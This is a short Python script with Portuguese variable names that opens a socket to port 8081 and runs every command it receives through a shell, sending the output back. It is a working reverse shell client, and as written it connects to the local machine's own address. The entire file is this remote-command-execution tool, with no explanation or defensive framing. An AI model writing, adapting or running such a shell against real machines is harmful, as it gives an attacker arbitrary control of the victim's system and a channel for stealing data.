import socket
import subprocess

host = socket.gethostbyname(socket.gethostname())
porta = 8081

client = socket.socket()
client.connect((host, porta))

while True:
    comando = client.recv(1024)
    comando = comando.decode()
    op = subprocess.Popen(comando, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    saida = op.stdout.read()
    saida_erro = op.stderr.read()
    client.send(saida + saida_erro)